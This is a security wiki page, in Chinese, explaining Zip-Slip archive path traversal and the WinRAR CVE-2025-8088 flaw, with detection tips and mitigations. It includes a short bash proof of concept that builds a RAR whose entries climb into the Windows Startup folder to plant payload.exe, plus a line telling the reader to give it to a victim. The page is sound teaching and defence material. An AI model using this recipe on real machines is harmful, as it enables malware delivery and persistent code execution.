# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 概述

许多归档格式（ZIP、RAR、TAR、7-ZIP等）允许每个条目携带其自己的**内部路径**。当提取工具盲目地尊重该路径时，包含`..`或**绝对路径**（例如`C:\Windows\System32\`）的构造文件名将被写入用户选择的目录之外。
这种类型的漏洞被广泛称为*Zip-Slip*或**归档提取路径遍历**。

后果从覆盖任意文件到通过在**自动运行**位置（如Windows *启动*文件夹）放置有效载荷直接实现**远程代码执行（RCE）**。

## 根本原因

1. 攻击者创建一个归档，其中一个或多个文件头包含：
* 相对遍历序列（`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`）
* 绝对路径（`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`）
2. 受害者使用一个信任嵌入路径而不是对其进行清理或强制在所选目录下提取的易受攻击工具提取归档。
3. 文件被写入攻击者控制的位置，并在系统或用户下次触发该路径时执行/加载。

## 真实案例 – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows（包括`rar` / `unrar` CLI、DLL和便携源）在提取过程中未能验证文件名。
一个包含条目的恶意RAR归档，例如：
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
将最终**位于**所选输出目录之外，并位于用户的*启动*文件夹内。登录后，Windows会自动执行其中的所有内容，从而提供*持久* RCE。

### 制作 PoC 压缩档案 (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
选项使用：
* `-ep`  – 按照给定的方式存储文件路径（**不**修剪前导 `./`）。

将 `evil.rar` 交给受害者，并指示他们使用易受攻击的 WinRAR 版本进行解压。

### 观察到的实际利用

ESET 报告了 RomCom (Storm-0978/UNC2596) 针对 RAR 压缩文件的网络钓鱼活动，利用 CVE-2025-8088 部署定制的后门并促进勒索软件操作。

## 检测提示

* **静态检查** – 列出归档条目，并标记任何包含 `../`、`..\\`、*绝对路径* (`C:`) 或非规范 UTF-8/UTF-16 编码的名称。
* **沙箱提取** – 使用 *安全* 提取器（例如，Python 的 `patool`、7-Zip ≥ 最新版、`bsdtar`）解压到一次性目录，并验证结果路径保持在该目录内。
* **端点监控** – 在 WinRAR/7-Zip 等打开归档后，警报新可执行文件写入 `Startup`/`Run` 位置。

## 缓解与加固

1. **更新提取器** – WinRAR 7.13 实现了适当的路径清理。用户必须手动下载，因为 WinRAR 缺乏自动更新机制。
2. 尽可能使用 **“忽略路径”** 选项提取归档（WinRAR: *提取 → "不提取路径"*）。
3. 在 **沙箱** 或虚拟机中打开不受信任的归档。
4. 实施应用程序白名单，并限制用户对自动运行目录的写入访问。

## 其他受影响/历史案例

* 2018 – Snyk 发布的大规模 *Zip-Slip* 通告，影响许多 Java/Go/JS 库。
* 2023 – 7-Zip CVE-2023-4011 在 `-ao` 合并期间类似的遍历。
* 任何未能在写入之前调用 `PathCanonicalize` / `realpath` 的自定义提取逻辑。

## 参考文献

- [BleepingComputer – WinRAR 零日漏洞被利用在归档提取中植入恶意软件](https://www.bleepingcomputer.com/news/security/winrar-zero-day-flaw-exploited-by-romcom-hackers-in-phishing-attacks/)
- [WinRAR 7.13 更新日志](https://www.win-rar.com/singlenewsview.html?&L=0&tx_ttnews%5Btt_news%5D=283&cHash=a64b4a8f662d3639dec8d65f47bc93c5)
- [Snyk – Zip Slip 漏洞分析](https://snyk.io/research/zip-slip-vulnerability)

{{#include ../banners/hacktricks-training.md}}
